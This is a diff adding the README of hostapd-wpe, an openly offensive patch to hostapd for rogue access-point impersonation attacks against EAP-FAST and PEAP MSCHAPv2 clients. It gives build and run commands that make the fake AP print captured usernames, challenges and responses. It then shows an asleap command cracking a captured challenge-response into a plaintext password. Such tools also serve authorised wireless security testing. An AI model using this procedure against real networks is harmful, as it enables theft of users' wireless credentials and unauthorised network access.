@@ -1,0 +1,91 @@
+hostapd-wpe (Wireless Pwnage Edition)
+by brad antoniewicz
+brad.antoniewicz@foundstone.com
+
+------------------------------------------
+
+The current hostapd-wpe.patch is for: hostapd-1.0.tar.gz
+
+hostapd-wpe is an extension of FreeRADIUS-WPE 
+(http://www.willhackforsushi.com/?page_id=37) and JoMo-Kun's 
+HostAP karma patch (http://www.foofus.net/?page_id=115). 
+
+Since FreeRADIUS does not support EAP-FAST in a non-development
+way, I decided to modify hostapd to facilitate AP impersonation 
+attacks with EAP-FAST Phase 0. It'll also work with all of 
+the Karma EAP-Types and more. 
+
+Currently it supports:
+	EAP-FAST (Phase 0)
+	PEAP MSCHAPv2
+
+TODO:
+	Logging to file, test more EAP-Types 
+
+Building 
+---------
+
+	hostapd does not support EAP-FAST out of the box. Instead you'll have 
+	to install a OpenSSL version > 1.0.0 and apply the hostapd-wpe patch
+	to make it all work. 
+
+	hostapd-wpe is assumed to be in /root/hostapd-wpe if you put it 
+	anywhere else, you'll need to change the config files, etc..
+
+	git clone https://github.com/OpenSecurityResearch/hostapd-wpe 
+
+	Here are the build steps for OpenSSL (on BT5R2):
+
+	Note: This will overwrite any previous OpenSSL instances and may
+	break things.. 
+
+	wget https://www.openssl.org/source/openssl-1.0.1c.tar.gz
+	tar -zxf openssl-1.0.1c.tar.gz
+	cd openssl-1.0.1c
+	./config --prefix=/usr --libdir=lib no-idea shared zlib enable-tlsext enable-rc5 enable-ssl2 enable-ssl3 enable-tls1
+	make depend
+	make
+	make install
+
+	Now apply the hostapd-wpe.patch:
+
+	wget http://hostap.epitest.fi/releases/hostapd-1.0.tar.gz
+	tar -zxf hostapd-1.0.tar.gz
+	cd hostapd-1.0
+	patch -p1 < /root/hostapd-wpe/hostapd-wpe.patch 
+	make
+	make install
+
+	I copied the certs directory and scripts from FreeRADIUS to ease that 
+	portion of things. You should just be able to:
+
+	cd /root/hostapd-wpe/certs
+	./bootstrap
+
+
+Running:
+----------------
+
+	With all of that complete, you can run hostapd. When testing, use either
+	hostapd-local-eapfast.conf or hostapd-local-peap.conf which will
+	create an AP and output the credentials. For instance:
+
+	hostapd -d ~/hostapd-wpe/hostapd-local-eapfast.conf
+
+	Look in the output for the username/challenge/response. I'll add
+	file logging soon. 
+
+	for instance here are the EAP-FAST Phase 0 creds from stdout:
+
+	username: jdslfkjs
+	challenge: bc:87:6c:48:37:d3:92:6e
+	response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0
+
+	and as always, we feed them into asleap to crack:
+
+	# asleap -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist 
+	asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
+	hash bytes:        b1ca
+	NT hash:           e614b958df9df49ec094b8730f0bb1ca
+	password:          bradtest
+
